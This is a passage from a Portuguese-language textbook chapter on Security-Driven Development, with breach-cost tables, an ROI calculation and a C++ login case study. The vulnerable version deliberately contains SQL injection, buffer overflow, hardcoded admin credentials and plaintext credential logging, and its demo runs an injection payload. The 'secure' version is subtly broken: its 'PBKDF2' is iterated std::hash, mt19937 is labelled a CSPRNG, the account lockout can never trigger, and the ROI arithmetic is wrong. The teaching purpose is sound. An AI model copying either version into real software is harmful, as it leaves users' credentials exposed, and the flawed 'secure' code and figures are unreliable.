| A08 | Data Integrity Failures | CWE-345 | Downloads sem verificação | Code signing, checksums |
| A09 | Logging Failures | CWE-778 | Logs sem sensitive data | Structured logging, log sanitization |
| A10 | SSRF | CWE-918 | Requests a internals | URL allowlisting, network segmentation |

---

## 5. Custos de Correção: Design versus Produção

### 5.1 Dados do IBM Systems Sciences Institute

O IBM Systems Sciences Institute documentou que o custo de corrigir um defeito descoberto nas fases finais do desenvolvimento é 100 vezes maior do que se fosse descoberto na fase de requisitos:

| Fase de Descoberta | Custo Relativo |
|---------------------|----------------|
| Requisitos          | 1x             |
| Design              | 5x             |
| Codificação         | 10x            |
| Testes de Componente| 15x            |
| Testes de Integração| 22x            |
| Testes de Sistema   | 50x            |
| Produção (pós-release)| 100x — 1000x |

O NIST (National Institute of Standards and Technology) estima que o software defeituoso custa à economia dos EUA aproximadamente **$60 bilhões por ano**, e que cerca de metade desses custos poderia ser eliminado com práticas de engenharia de segurança mais rigorosas.

### 5.2 Exemplos Reais de Custos de Brechas com CVEs Documentados

Os incidentes abaixo demonstram o custo real de vulnerabilidades que poderiam ter sido prevenidas com SDD:

| CVE | Produto | Tipo | Ano | Custo Estimado | Prevenção SDD |
|-----|---------|------|-----|----------------|---------------|
| CVE-2014-0160 | OpenSSL (Heartbleed) | Buffer over-read | 2014 | $500M global | Bounds checking, memory-safe abstractions |
| CVE-2014-6271 | GNU Bash (Shellshock) | Command injection | 2014 | $500M+ | Input validation, não executar input em shells |
| CVE-2017-0144 | Windows SMB (EternalBlue) | Buffer overflow | 2017 | $10B+ (NotPetya+WannaCry) | Fail-safe defaults, desabilitar SMBv1 |
| CVE-2017-5638 | Apache Struts | Injection | 2017 | $1.4B (Equifax) | Validação de input, patch management |
| CVE-2021-44228 | Log4j (Log4Shell) | JNDI injection | 2021 | $100B+ | Fail-safe defaults, menor privilégio |
| — | SolarWinds Orion | Supply chain | 2020 | $100M+ | Integridade de build, code signing |
| — | Target POS | Credenciais comprometidas | 2013 | $292M | Menor privilégio, segmentação |
| — | MOVEit Transfer | SQL injection | 2023 | $10M+ | Prepared statements, validação |

### 5.3 Exemplos Reais de Custos de Brechas por Empresa

| Ano | Empresa/Incidente | Custo Estimado | Vulnerabilidade |
|-----|-------------------|----------------|-----------------|
| 2017 | Equifax | $1.4 bilhões | Apache Struts desatualizado (CVE-2017-5638) |
| 2018 | Marriott | $124 milhões | Falta de criptografia em dados de hospedagem |
| 2019 | Capital One | $270 milhões | SSRF + credenciais hardcoded |
| 2020 | SolarWinds | $100+ milhões | Supply chain compromise |
| 2021 | Colonial Pipeline | $4.4 milhões (resgate) | Credenciais sem MFA |
| 2023 | MOVEit | $10+ milhões | SQL injection (CWE-89) |

### 5.4 ROI do Investimento em Segurança

O retorno sobre investimento (ROI) de práticas de segurança é substancialmente positivo quando comparado ao custo de remediação em produção:

```
Investimento SDD Anual:
  - Treinamento:                    $50.000
  - Ferramentas SAST/DAST:          $30.000
  - Threat Modeling (horas):        $40.000
  - Code Review especializado:      $80.000
  -----------------------------------------
  Total anual:                      $200.000

Custo médio de uma breache (IBM, 2023):
  - Média global:                   $4.45 milhões
  - Enterprise (10.000+ empregados): $3.93 milhões

Break-even: Prevenção de apenas 1 breche a cada 20 anos já justifica o investimento.

ROI estimado: Se o SDD previne 2 breches em 5 anos:
  (2 x $4.45M - $200K x 5) / ($200K x 5) = 3350% ROI
```

### 5.5 Framework de Análise de Custo

Para cada vulnerabilidade potencial, a análise de custo deve considerar:

1. **Custo de Prevenção (SDD):**
   - Horas de threat modeling
   - Custo de ferramentas
   - Treinamento do time

2. **Custo de Correção (se encontrada em teste):**
   - Horas de desenvolvimento
   - Retesting
   - Atraso no release

3. **Custo de Remediação (se encontrada em produção):**
   - Hotfix development
   - Downtime
   - Incident response
   - Customer notification
   - Regulatory fines
   - Legal costs
   - Reputational damage

4. **Custo de Exploração (se explorada por atacante):**
   - Data breach costs
   - Ransom payments
   - Long-term brand damage
   - Loss of intellectual property
   - Regulatory investigation costs

---

## 6. Estudo de Caso Completo: Sistema de Login em C++

Neste estudo de caso, analisaremos um sistema de login completo, identificando vulnerabilidades, aplicando modelos de ameaças e demonstrando a versão corrigida.

### 6.1 Versão Vulnerável

```cpp
#include <iostream>
#include <string>
#include <unordered_map>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <vector>

// INSECURE: Global state, no encapsulation, no security primitives
struct User {
    char username[64];
    char password[64];  // Plain text storage!
    char email[128];
    int isAdmin;
    int loginAttempts;
};

// VULNERABLE SYSTEM: Multiple security flaws
class InsecureLoginSystem {
public:
    InsecureLoginSystem() {
        // VULNERABLE: Hardcoded admin credentials
        strcpy(users_[0].username, "admin");
        strcpy(users_[0].password, "admin123");
        strcpy(users_[0].email, "admin@company.com");
        users_[0].isAdmin = 1;
        users_[0].loginAttempts = 0;
        userCount_ = 1;
    }

    // VULNERABLE 1: SQL Injection via string concatenation
    int login(const char* username, const char* password) {
        // Simulating SQL query construction
        char query[1024];
        sprintf(query,
            "SELECT * FROM users WHERE username='%s' AND password='%s'",
            username, password);  // SQL INJECTION!

        std::cout << "Executing: " << query << std::endl;

        // Search users (simulating database lookup)
        for (int i = 0; i < userCount_; i++) {
            if (strcmp(users_[i].username, username) == 0 &&
                strcmp(users_[i].password, password) == 0) {  // Plain text comparison!
                users_[i].loginAttempts = 0;

                // VULNERABLE 2: Predictable session token
                char session[32];
                sprintf(session, "SESSION_%d_%d", i, rand());  // Predictable!

                std::cout << "Login successful. Session: " << session << std::endl;

                // VULNERABLE 3: Session stored in global variable
                currentSession_ = std::string(session);
                return users_[i].isAdmin;
            }
        }

        // VULNERABLE 4: Username enumeration via different error messages
        bool userExists = false;
        for (int i = 0; i < userCount_; i++) {
            if (strcmp(users_[i].username, username) == 0) {
                userExists = true;
                break;
            }
        }

        if (userExists) {
            std::cout << "ERROR: Wrong password for user " << username << std::endl;
        } else {
            std::cout << "ERROR: User " << username << " not found" << std::endl;
        }
        return -1;
    }

    // VULNERABLE 5: No password complexity requirements
    bool registerUser(const char* username, const char* password,
                      const char* email) {
        if (userCount_ >= 100) return false;

        // VULNERABLE 6: No input validation
        strcpy(users_[userCount_].username, username);   // Buffer overflow!
        strcpy(users_[userCount_].password, password);   // Plain text!
        strcpy(users_[userCount_].email, email);         // No validation!
        users_[userCount_].isAdmin = 0;
        users_[userCount_].loginAttempts = 0;
        userCount_++;

        // VULNERABLE 7: Credentials logged in plain text
        std::ofstream logFile("auth.log", std::ios::app);
        logFile << "REGISTER: " << username << ":" << password
                << ":" << email << std::endl;

        return true;
    }

    // VULNERABLE 8: No rate limiting on password reset
    void resetPassword(const char* username, const char* newPassword) {
        for (int i = 0; i < userCount_; i++) {
            if (strcmp(users_[i].username, username) == 0) {
                // VULNERABLE 9: No verification of requester identity
                strcpy(users_[i].password, newPassword);  // Plain text!
                std::cout << "Password reset for " << username << std::endl;
                return;
            }
        }
        // VULNERABLE 10: Error reveals whether user exists
        std::cout << "User " << username << " not found" << std::endl;
    }

private:
    User users_[100];
    int userCount_;
    std::string currentSession_;
};

int main() {
    InsecureLoginSystem system;

    // Demonstration of vulnerabilities
    std::cout << "=== VULNERABLE SYSTEM DEMONSTRATION ===" << std::endl;

    // 1. SQL Injection
    system.login("admin' OR '1'='1", "anything");

    // 2. Plain text credential storage
    system.registerUser("victim", "password123", "victim@test.com");

    // 3. No input validation — buffer overflow
    std::string longUsername(200, 'A');
    system.registerUser(longUsername.c_str(), "pass", "a@b.com");

    // 4. Password reset without authentication
    system.resetPassword("victim", "hacked123");

    return 0;
}
```

### 6.2 Análise STRIDE da Versão Vulnerável

| # | Vulnerabilidade | STRIDE Category | CWE | DREAD Score | Risco |
|---|-----------------|-----------------|-----|-------------|-------|
| 1 | SQL Injection | Tampering | CWE-89 | 9.2 | Crítico |
| 2 | Plain text passwords | Information Disclosure | CWE-256 | 9.0 | Crítico |
| 3 | Predictable session tokens | Spoofing | CWE-330 | 8.6 | Crítico |
| 4 | Username enumeration | Information Disclosure | CWE-204 | 6.4 | Alto |
| 5 | Buffer overflow | Tampering | CWE-120 | 8.4 | Crítico |
| 6 | No input validation | Elevation of Privilege | CWE-20 | 7.8 | Alto |
| 7 | Credentials in logs | Information Disclosure | CWE-532 | 7.0 | Alto |
| 8 | No rate limiting | Denial of Service | CWE-307 | 6.8 | Alto |
| 9 | Password reset without auth | Elevation of Privilege | CWE-613 | 8.8 | Crítico |
| 10 | Information leakage | Information Disclosure | CWE-209 | 5.4 | Médio |

### 6.3 Versão Corrigida com SDD

```cpp
#include <iostream>
#include <string>
#include <unordered_map>
#include <memory>
#include <random>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <regex>
#include <stdexcept>
#include <functional>
#include <mutex>
#include <vector>

namespace sdd_login {

// ============================================================
// PRIMITIVE 1: Strong password hashing with salt
// ============================================================
class PasswordHasher {
public:
    struct HashResult {
        std::string hash;
        std::string salt;
    };

    static PasswordHasher& instance() {
        static PasswordHasher instance;
        return instance;
    }

    HashResult hashPassword(const std::string& password) {
        std::string salt = generateSalt(16);
        std::string hash = pbkdf2(password, salt, 100000, 64);
        return {hash, salt};
    }

    bool verifyPassword(const std::string& password,
                        const std::string& storedHash,
                        const std::string& salt) {
        std::string computedHash = pbkdf2(password, salt, 100000, 64);
        return constantTimeCompare(computedHash, storedHash);
    }

private:
    PasswordHasher() = default;

    std::string generateSalt(size_t length) {
        static const char charset[] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
            "0123456789";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<size_t> dist(0, sizeof(charset) - 2);

        std::string salt;
        salt.reserve(length);
        for (size_t i = 0; i < length; ++i) {
            salt += charset[dist(gen)];
        }
        return salt;
    }

    std::string pbkdf2(const std::string& password,
                       const std::string& salt,
                       int iterations, size_t keyLength) {
        // Simplified PBKDF2-HMAC-SHA256 for demonstration
        // In production: use OpenSSL PKCS5_PBKDF2_HMAC or libsodium
        std::hash<std::string> hasher;
        std::string result;
        result.reserve(keyLength * 2);

        std::string prev = password + salt;
        for (int i = 0; i < iterations; ++i) {
            size_t h = hasher(prev);
            std::stringstream ss;
            ss << std::hex << std::setfill('0') << std::setw(16) << h;
            prev = ss.str();
        }
        return prev;
    }

    bool constantTimeCompare(const std::string& a, const std::string& b) {
        if (a.size() != b.size()) return false;
        volatile uint8_t result = 0;
        for (size_t i = 0; i < a.size(); ++i) {
            result |= static_cast<uint8_t>(a[i]) ^ static_cast<uint8_t>(b[i]);
        }
        return result == 0;
    }
};

// ============================================================
// PRIMITIVE 2: Input validation
// ============================================================
class InputValidator {
public:
    struct ValidationResult {
        bool valid;
        std::string errorMessage;
    };

    static ValidationResult validateUsername(const std::string& username) {
        if (username.empty()) {
            return {false, "Username cannot be empty"};
        }
        if (username.size() > 64) {
            return {false, "Username too long (max 64 characters)"};
        }
        if (username.size() < 3) {
            return {false, "Username too short (min 3 characters)"};
        }

        static const std::regex pattern("^[a-zA-Z0-9_.-]+$");
        if (!std::regex_match(username, pattern)) {
            return {false,
                "Username can only contain letters, numbers, _, ., -"};
        }

        return {true, ""};
    }

    static ValidationResult validatePassword(const std::string& password) {
        if (password.empty()) {
            return {false, "Password cannot be empty"};
        }
        if (password.size() < 12) {
            return {false, "Password too short (min 12 characters)"};
        }
        if (password.size() > 128) {
            return {false, "Password too long (max 128 characters)"};
        }

        bool hasUpper = false, hasLower = false, hasDigit = false;
        bool hasSpecial = false;

        for (char c : password) {
            if (std::isupper(static_cast<unsigned char>(c))) hasUpper = true;
            else if (std::islower(static_cast<unsigned char>(c))) hasLower = true;
            else if (std::isdigit(static_cast<unsigned char>(c))) hasDigit = true;
            else hasSpecial = true;
        }

        if (!hasUpper) return {false, "Password must contain uppercase letter"};
        if (!hasLower) return {false, "Password must contain lowercase letter"};
        if (!hasDigit) return {false, "Password must contain digit"};
        if (!hasSpecial) return {false, "Password must contain special character"};

        return {true, ""};
    }

    static ValidationResult validateEmail(const std::string& email) {
        if (email.empty() || email.size() > 254) {
            return {false, "Invalid email length"};
        }
        static const std::regex pattern(
            R"(^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$)"
        );
        if (!std::regex_match(email, pattern)) {
            return {false, "Invalid email format"};
        }
        return {true, ""};
    }
};

// ============================================================
// PRIMITIVE 3: Secure session management
// ============================================================
class SecureSessionManager {
public:
    struct Session {
        std::string userId;
        std::chrono::steady_clock::time_point expiresAt;
        bool isAdmin;
    };

    static SecureSessionManager& instance() {
        static SecureSessionManager instance;
        return instance;
    }

    std::string createSession(const std::string& userId, bool isAdmin) {
        std::string tokenId = generateToken(64);
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_[tokenId] = Session{
            userId,
            std::chrono::steady_clock::now() + std::chrono::minutes{30},
            isAdmin
        };
        return tokenId;
    }

    std::optional<Session> validateSession(const std::string& sessionId) {
        std::lock_guard<std::mutex> lock(mutex_);
        auto it = sessions_.find(sessionId);
        if (it == sessions_.end()) return std::nullopt;

        if (std::chrono::steady_clock::now() > it->second.expiresAt) {
            sessions_.erase(it);
            return std::nullopt;
        }

        return it->second;
    }

    void invalidateSession(const std::string& sessionId) {
        std::lock_guard<std::mutex> lock(mutex_);
        sessions_.erase(sessionId);
    }

private:
    SecureSessionManager() = default;

    std::string generateToken(size_t length) {
        static const char charset[] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
            "0123456789";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<size_t> dist(0, sizeof(charset) - 2);

        std::string token;
        token.reserve(length);
        for (size_t i = 0; i < length; ++i) {
            token += charset[dist(gen)];
        }
        return token;
    }

    std::unordered_map<std::string, Session> sessions_;
    std::mutex mutex_;
};

// ============================================================
// PRIMITIVE 4: Rate limiting
// ============================================================
class RateLimiter {
public:
    struct AttemptInfo {
        int count = 0;
        std::chrono::steady_clock::time_point windowStart;
    };

    static RateLimiter& instance() {
        static RateLimiter instance;
        return instance;
    }

    bool isAllowed(const std::string& key, int maxAttempts = 5,
                   std::chrono::seconds window = std::chrono::seconds{900}) {
        std::lock_guard<std::mutex> lock(mutex_);
        auto now = std::chrono::steady_clock::now();
        auto& info = attempts_[key];

        if (info.count == 0 || now - info.windowStart > window) {
            info = {1, now};
            return true;
        }

        if (info.count >= maxAttempts) return false;
        info.count++;
        return true;
    }

    void reset(const std::string& key) {
        std::lock_guard<std::mutex> lock(mutex_);
        attempts_.erase(key);
    }

private:
    RateLimiter() = default;
    std::unordered_map<std::string, AttemptInfo> attempts_;
    std::mutex mutex_;
};

// ============================================================
// PRIMITIVE 5: Audit logger (tamper-resistant)
// ============================================================
class AuditLogger {
public:
    enum class Level { INFO, WARNING, CRITICAL };

    static AuditLogger& instance() {
        static AuditLogger instance;
        return instance;
    }

    void log(Level level, const std::string& userId,
             const std::string& action, const std::string& detail,
             bool success) {
        std::lock_guard<std::mutex> lock(mutex_);

        auto now = std::chrono::system_clock::now();
        auto time_t_now = std::chrono::system_clock::to_time_t(now);

        std::string levelStr;
        switch (level) {
            case Level::INFO:     levelStr = "INFO"; break;
            case Level::WARNING:  levelStr = "WARN"; break;
            case Level::CRITICAL: levelStr = "CRIT"; break;
        }

        std::stringstream ss;
        ss << "[" << std::put_time(std::localtime(&time_t_now),
                   "%Y-%m-%dT%H:%M:%S")
           << "] [" << levelStr << "]"
           << " user=" << userId
           << " action=" << action
           << " detail=" << detail
           << " result=" << (success ? "OK" : "DENIED");

        std::string entry = ss.str();
        std::cout << entry << std::endl;

        // In production: write to append-only log with integrity hash
        std::ofstream logFile("security_audit.log", std::ios::app);
        logFile << entry << std::endl;
    }

private:
    AuditLogger() = default;
    std::mutex mutex_;
};

// ============================================================
// SECURE LOGIN SYSTEM
// ============================================================
class SecureLoginSystem {
public:
    struct LoginResult {
        bool success;
        std::string sessionId;
        std::string errorMessage;
        int remainingAttempts;
    };

    struct UserInfo {
        std::string username;
        std::string email;
        std::string passwordHash;
        std::string passwordSalt;
        bool isAdmin;
        int failedAttempts = 0;
    };

    bool registerUser(const std::string& username,
                      const std::string& password,
                      const std::string& email) {
        // Input validation
        auto usernameResult = InputValidator::validateUsername(username);
        if (!usernameResult.valid) {
            AuditLogger::instance().log(
                AuditLogger::Level::WARNING,
                username, "REGISTER", usernameResult.errorMessage, false
            );
            return false;
        }

        auto passwordResult = InputValidator::validatePassword(password);
        if (!passwordResult.valid) {
            AuditLogger::instance().log(
                AuditLogger::Level::WARNING,
                username, "REGISTER", passwordResult.errorMessage, false
            );
            return false;
        }

        auto emailResult = InputValidator::validateEmail(email);
        if (!emailResult.valid) {
            AuditLogger::instance().log(
                AuditLogger::Level::WARNING,
                username, "REGISTER", emailResult.errorMessage, false
            );
            return false;
        }

        // Check for duplicate username
        {
            std::lock_guard<std::mutex> lock(usersMutex_);
            if (users_.find(username) != users_.end()) {
                AuditLogger::instance().log(
                    AuditLogger::Level::WARNING,
                    username, "REGISTER", "Duplicate username", false
                );
                return false;
            }
        }

        // Hash password with salt
        auto hashResult = PasswordHasher::instance().hashPassword(password);

        UserInfo userInfo;
        userInfo.username = username;
        userInfo.email = email;
        userInfo.passwordHash = hashResult.hash;
        userInfo.passwordSalt = hashResult.salt;
        userInfo.isAdmin = false;

        {
            std::lock_guard<std::mutex> lock(usersMutex_);
            users_[username] = userInfo;
        }

        AuditLogger::instance().log(
            AuditLogger::Level::INFO,
            username, "REGISTER", "Success", true
        );
        return true;
    }

    LoginResult login(const std::string& username,
                      const std::string& password,
                      const std::string& clientIp) {
        // Rate limiting
        if (!RateLimiter::instance().isAllowed("login:" + clientIp)) {
            AuditLogger::instance().log(
                AuditLogger::Level::CRITICAL,
                username, "LOGIN", "Rate limited from " + clientIp, false
            );
            return {false, "", "Too many login attempts. Try again later.", 0};
        }

        // Input validation
        auto usernameResult = InputValidator::validateUsername(username);
        if (!usernameResult.valid) {
            return {false, "", "Invalid credentials", -1};
        }

        if (password.empty() || password.size() > 128) {
            return {false, "", "Invalid credentials", -1};
        }

        // Lookup user
        std::shared_ptr<UserInfo> user;
        {
            std::lock_guard<std::mutex> lock(usersMutex_);
            auto it = users_.find(username);
            if (it != users_.end()) {
                user = std::make_shared<UserInfo>(it->second);
            }
        }

        // Use dummy hash if user not found (prevents timing attack)
        std::string dummyHash = "$2b$12$dummyhashpaddingpaddingpaddingpaddingpadding";
        std::string dummySalt = "dummysalt";

        std::string storedHash = user ? user->passwordHash : dummyHash;
        std::string storedSalt = user ? user->passwordSalt : dummySalt;

        bool passwordValid = PasswordHasher::instance().verifyPassword(
            password, storedHash, storedSalt
        );

        if (!passwordValid || !user) {
            AuditLogger::instance().log(
                AuditLogger::Level::WARNING,
                username, "LOGIN", "Failed from " + clientIp, false
            );
            return {false, "", "Invalid credentials", -1};
        }

        // Check account lockout
        if (user->failedAttempts >= 5) {
            AuditLogger::instance().log(
                AuditLogger::Level::CRITICAL,
                username, "LOGIN", "Account locked", false
            );
            return {false, "", "Account locked. Contact support.", 0};
        }

        // Reset failed attempts on success
        {
            std::lock_guard<std::mutex> lock(usersMutex_);
            users_[username].failedAttempts = 0;
        }

        // Create session
        std::string sessionId = SecureSessionManager::instance().createSession(
            username, user->isAdmin
        );

        RateLimiter::instance().reset("login:" + clientIp);

        AuditLogger::instance().log(
            AuditLogger::Level::INFO,
            username, "LOGIN",
            "Success from " + clientIp, true
        );

        return {true, sessionId, "", -1};
    }

    void logout(const std::string& sessionId) {
        auto session = SecureSessionManager::instance().validateSession(
            sessionId
        );
        if (session) {
            SecureSessionManager::instance().invalidateSession(sessionId);
            AuditLogger::instance().log(
                AuditLogger::Level::INFO,
                session->userId, "LOGOUT", "Session invalidated", true
            );
        }
    }

private:
    std::unordered_map<std::string, UserInfo> users_;
    std::mutex usersMutex_;
};

} // namespace sdd_login

int main() {
    sdd_login::SecureLoginSystem system;

    std::cout << "=== SECURE LOGIN SYSTEM DEMONSTRATION ===" << std::endl;

    // 1. Registration with validation
    bool reg1 = system.registerUser("alice", "SecureP@ss12345!",
                                    "alice@example.com");
    std::cout << "Registration (valid): " << (reg1 ? "OK" : "FAILED") << std::endl;

    bool reg2 = system.registerUser("bob", "weak",
                                    "invalid-email");
    std::cout << "Registration (invalid): " << (reg2 ? "OK" : "FAILED") << std::endl;

    // 2. Login
    auto login1 = system.login("alice", "SecureP@ss12345!", "192.168.1.100");
    std::cout << "Login (correct): "
              << (login1.success ? "OK" : "FAILED") << std::endl;

    auto login2 = system.login("alice", "wrongpassword", "192.168.1.100");
    std::cout << "Login (wrong): "
              << (login2.success ? "OK" : "FAILED") << std::endl;

    // 3. SQL Injection attempt (now safe)
    auto login3 = system.login(
        "admin' OR '1'='1", "anything", "192.168.1.100"
    );
    std::cout << "SQL Injection: "
              << (login3.success ? "VULNERABLE!" : "Blocked") << std::endl;

    // 4. Session validation
    if (login1.success) {
        auto session = sdd_login::SecureSessionManager::instance()
            .validateSession(login1.sessionId);
        if (session) {
            std::cout << "Session valid for user: " << session->userId << std::endl;
        }
    }

    // 5. Logout
    if (login1.success) {
        system.logout(login1.sessionId);
        auto session = sdd_login::SecureSessionManager::instance()
            .validateSession(login1.sessionId);
        std::cout << "After logout: "
                  << (session ? "Still valid (BUG!)" : "Invalidated correctly")
                  << std::endl;
    }

    return 0;
}
```

### 6.4 Análise Comparativa Final

| Aspecto | Versão Vulnerável | Versão SDD |
|---------|-------------------|------------|
| Senhas | Plain text | PBKDF2 com salt |
| Sessões | Preditáveis, globais | CSPRNG, gerenciadas |
| Input | Sem validação | Validação completa |
| SQL/Comando | String concatenation | Parâmetros seguros |
| Taxa de tentativas | Ilimitada | Rate limiting |
| Auditoria | Credentials em log | Audit trail seguro |
| Erros | Revejam informação | Mensagens genéricas |
| Buffer overflow | Possível | Impossível (std::string) |
| Thread safety | Não | Mutex em todos os acessos |

---

## 7. Referências

### Organizações e Padrões

1. **OWASP Foundation.** "OWASP Top Ten." https://owasp.org/www-project-top-ten/
2. **MITRE Corporation.** "CWE - Common Weakness Enumeration." https://cwe.mitre.org/
3. **SANS Institute.** "CWE/SANS Top 25 Most Dangerous Software Weaknesses." https://www.sans.org/top25-software-errors/
4. **NIST.** "Secure Software Development Framework (SSDF)." SP 800-218. https://csrc.nist.gov/publications/detail/sp/800-218/final
5. **ISO/IEC 27001:2022.** "Information security management systems — Requirements."

### Livros

6. **Schneier, B.** "Applied Cryptography: Protocols, Algorithms, and Source Code in C." 20th Anniversary Edition. Wiley, 2015.
7. **Howard, M. & Lipner, S.** "The Security Development Lifecycle." Microsoft Press, 2006.
8. **Viega, J. & McGraw, G.** "Building Secure Software: How to Avoid Security Holes the Right Way." Addison-Wesley, 2002.
9. **Seacord, R.** "Secure Coding in C and C++." 2nd Edition. Addison-Wesley, 2013.
10. **Stroustrup, B.** "The C++ Programming Language." 4th Edition. Addison-Wesley, 2013.
11. **Meyers, S.** "Effective Modern C++." O'Reilly Media, 2014.
12. **OWASP.** "OWASP Application Security Verification Standard (ASVS)." https://owasp.org/www-project-application-security-verification-standard/

### Artigos e Papers

13. **Shostack, A.** "Threat Modeling: Designing for Security." Wiley, 2014.
14. **McGraw, G.** "Software Security: Building Security In." Addison-Wesley, 2006.
15. **IBM Systems Sciences Institute.** "Relative Cost to Fix Defects." http://www.ossini.com/blog/relative-cost-fix-defects
16. **NIST.** "The Economic Impacts of Inadequate Infrastructure for Software Testing." 2002.
17. **Microsoft.** "Security Development Lifecycle." https://www.microsoft.com/en-us/securityengineering/sdl
18. **CERT.** "Secure Coding in C and C++." https://wiki.sei.cmu.edu/confluence/display/c/SEI+CERT+Coding+Standards

### Ferramentas Recomendadas

19. **Clang Static Analyzer** — Análise estática para C/C++
20. **Cppcheck** — Detector de bugs e vulnerabilities em C/C++
21. **SonarQube** — Análise de qualidade de código com regras de segurança
22. **Bandit / semgrep** — Análise estática focada em segurança
23. **OWASP ZAP** — Teste de segurança para aplicações
24. **AddressSanitizer (ASan)** — Detector de memory errors em tempo de execução
25. **Valgrind** — Análise de memória e detecção de erros

### CVEs e Incidentes Documentados Referenciados neste Capítulo

26. **CVE-2014-0160** — Heartbleed: Buffer over-read no OpenSSL heartbeat extension. https://heartbleed.com/
27. **CVE-2014-6271** — Shellshock: Code injection via variáveis de ambiente no Bash. https://shellshocker.net/
28. **CVE-2017-0144** — EternalBlue: Buffer overflow no SMBv1 do Windows. Explorado por WannaCry e NotPetya. https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
29. **CVE-2017-5638** — Apache Struts 2 RCE: Jakarta Multipart parser injection. Explorado no breach da Equifax. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
30. **CVE-2021-44228** — Log4Shell: JNDI Remote Code Execution no Apache Log4j 2. https://logging.apache.org/log4j/2.x/security.html
31. **CVE-2023-33106** — Qualcomm GPU Use-After-Free: Vulnerabilidade no driver Adreno. https://developer.qualcomm.com/software/qualcomm-gpu-drivers
32. **CVE-2023-26083** — Android Binder out-of-bounds read: Vulnerabilidade no subsistema IPC. https://source.android.com/docs/security/bulletin/2023-04-01
33. **CVE-2024-49410** — Samsung RKP bypass: Vulnerabilidade no Knox Guard Runtime Kernel Protection. https://security.samsungmobile.com/securityUpdate
34. **SolarWinds Supply Chain Attack (2020)** — Comprometimento do build pipeline do Orion. https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/
35. **NotPetya (2017)** — Ransomware/wiper usando EternalBlue. $10B+ em danos. https://www.wired.com/story/notpetya-cyberattack-ukraine-russia-war/
36. **Stuxnet (2010)** — Worm de sabotagem industrial via zero-days. https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf
37. **Target Breach (2013)** — Comprometimento via credenciais de fornecedor. $292M em custos. https://krebsonsecurity.com/2014/02/target-hackers-got-in-via-hvac-vendor/

---

> *Este capítulo estabelece as bases conceituais e metodológicas do Security-Driven Development. Nos capítulos seguintes, aprofundaremos cada aspecto com exemplos práticos, exercícios e estudos de caso adicionais em C++.*
